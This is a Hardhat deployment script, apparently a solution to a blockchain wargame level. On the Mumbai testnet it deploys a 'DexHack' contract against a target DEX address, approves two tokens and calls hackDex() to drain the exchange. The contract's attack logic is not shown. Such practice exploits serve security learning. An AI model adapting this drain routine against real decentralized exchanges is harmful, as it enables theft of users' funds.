const { ethers } = require("hardhat")
const { logTxResult } = require("../../utils/logTxResult")
const {
  abi: ABIIERC20,
} = require("../../artifacts/contracts/22/DEX.sol/IERC20.json")

require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)
const signerAddr = signer.address

/* DEPLOY + ATTACK */
async function main() {
  /* CONTRACT NAME */
  const contractToDeploy = "DexHack"
  const MyContract = await ethers.getContractFactory(contractToDeploy)
  /* @remind la private key va en hardhat.config.js */
  const DexHackContract = await MyContract.deploy(
    "0xc0102f8E61974B55250340614c03E0449Ca5b391",
    {
      gasLimit: 1000000,
    }
  )
  console.log("DexHackContract", DexHackContract.address)

  /* first, we have to PPROVE token swap */
  const token1Address = "0x1BC038673143C48964A76cBd019f2d5c1C65B630"
  const token2Address = "0x9E7E73DCc6EB018752Bc43C9a9749d251Aa493be"

  const token1Contract = new ethers.Contract(token1Address, ABIIERC20, provider)

  const token2Contract = new ethers.Contract(token2Address, ABIIERC20, provider)

  console.log("APPROVEs")

  const tx = await token1Contract
    .connect(signer)
    .approve(DexHackContract.address, 1000000, {
      gasLimit: 1000000,
    })
  const res = await tx.wait()
  logTxResult(res)
  const tx2 = await token2Contract
    .connect(signer)
    .approve(DexHackContract.address, 1000000, {
      gasLimit: 1000000,
    })
  const res2 = await tx2.wait()
  logTxResult(res2)

  /* call hackDex function */
  console.log("call hackDex function")

  const tx3 = await DexHackContract.connect(signer).hackDex({
    gasLimit: 1000000,
  })
  const res3 = await tx3.wait()
  logTxResult(res3)
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/22/DeployAndCall__Attack.js --network mumbai
*/
